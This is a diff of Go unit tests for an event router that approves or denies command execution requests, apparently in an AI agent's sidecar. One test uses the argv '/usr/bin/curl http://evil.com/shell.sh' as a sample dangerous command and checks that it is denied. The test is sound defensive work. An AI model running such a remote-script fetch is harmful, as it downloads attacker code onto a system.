@@ -571,6 +571,67 @@ func TestRouteApprovalDangerousCommand(t *testing.T) {
 	}
 }
 
+func TestRouteApprovalDangerousArgvOnly(t *testing.T) {
+	received := make(chan receivedRequest, 5)
+	srv := startMockGW(t, rpcRecordingLoop(received))
+	client := connectToMockGW(t, srv)
+	store, logger := testStoreAndLogger(t)
+
+	r := NewEventRouter(client, store, logger, true, nil)
+
+	payload, _ := json.Marshal(ApprovalRequestPayload{
+		ID: "approval-argv-only",
+		SystemRunPlan: &SystemRunPlan{
+			RawCommand: "",
+			Argv:       []string{"/usr/bin/curl", "http://evil.com/shell.sh"},
+		},
+	})
+
+	r.Route(EventFrame{
+		Type: "event", Event: "exec.approval.requested",
+		Payload: payload,
+	})
+
+	rpc := drainRPC(t, received)
+	if rpc.Method != "exec.approval.resolve" {
+		t.Errorf("Method = %q, want exec.approval.resolve", rpc.Method)
+	}
+	var params ApprovalResolveParams
+	json.Unmarshal(rpc.Params, &params)
+	if params.Approved {
+		t.Error("Approved should be false — argv contains curl but rawCommand is empty")
+	}
+}
+
+func TestRouteApprovalSafeArgvAutoApproved(t *testing.T) {
+	received := make(chan receivedRequest, 5)
+	srv := startMockGW(t, rpcRecordingLoop(received))
+	client := connectToMockGW(t, srv)
+	store, logger := testStoreAndLogger(t)
+
+	r := NewEventRouter(client, store, logger, true, nil)
+
+	payload, _ := json.Marshal(ApprovalRequestPayload{
+		ID: "approval-safe-argv",
+		SystemRunPlan: &SystemRunPlan{
+			RawCommand: "ls -la",
+			Argv:       []string{"ls", "-la"},
+		},
+	})
+
+	r.Route(EventFrame{
+		Type: "event", Event: "exec.approval.requested",
+		Payload: payload,
+	})
+
+	rpc := drainRPC(t, received)
+	var params ApprovalResolveParams
+	json.Unmarshal(rpc.Params, &params)
+	if !params.Approved {
+		t.Error("Approved should be true — both rawCmd and argv are safe with auto-approve on")
+	}
+}
+
 func TestRouteApprovalAutoApprove(t *testing.T) {
 	received := make(chan receivedRequest, 5)
 	srv := startMockGW(t, rpcRecordingLoop(received))
@@ -915,19 +976,6 @@ func TestHandleAdmissionResultNoTakeAction(t *testing.T) {
 		},
 		Verdict: watcher.VerdictBlocked,
 		Reason:  "on block list",
-	})
-}
-
-func TestHandleAdmissionResultNonSkill(t *testing.T) {
-	s := &Sidecar{cfg: &config.Config{}}
-
-	// MCP events should be ignored even with blocked verdict
-	s.handleAdmissionResult(watcher.AdmissionResult{
-		Event: watcher.InstallEvent{
-			Type: watcher.InstallMCP,
-			Name: "mcp-server",
-		},
-		Verdict: watcher.VerdictBlocked,
 	})
 }
 
